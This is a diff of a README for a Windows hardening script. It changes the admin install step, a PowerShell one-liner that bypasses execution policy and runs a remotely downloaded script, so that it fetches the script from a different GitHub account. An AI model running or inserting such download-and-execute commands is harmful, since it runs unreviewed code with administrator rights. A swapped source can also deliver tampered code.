@@ -72,7 +72,7 @@ A list of commonly used resources that I find helpful are listed in the acknowle
 1. Open a CMD.exe (or a powershell.exe) with administrator privileges
 2. Run the following command
 ```ps1
-powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://github.com/1mm0rt41PC/HowTo/raw/master/Harden/Windows/AutoHarden_RELEASE.ps1');"
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://github.com/c3dcmps/HowTo/raw/master/Harden/Windows/AutoHarden_RELEASE.ps1');"
 ```
 3. Answers to a few parameterization questions
 
